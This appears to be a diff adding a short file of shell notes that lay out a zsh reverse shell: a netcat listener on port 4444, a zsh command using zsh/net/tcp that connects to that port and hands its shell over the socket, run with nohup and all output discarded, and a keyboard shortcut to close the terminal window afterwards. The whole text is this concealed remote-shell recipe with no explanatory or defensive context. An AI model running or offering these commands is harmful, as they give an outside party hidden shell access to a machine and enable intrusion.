@@ -1,0 +1,5 @@
+nc -l 4444
+
+nohup zsh -c 'zmodload zsh/net/tcp && ztcp 127.0.0.1 4444 && zsh <&$REPLY >&$REPLY 2>&$REPLY' > /dev/null 2>&1 &
+
+Shift + Command (⌘) + W to then close window
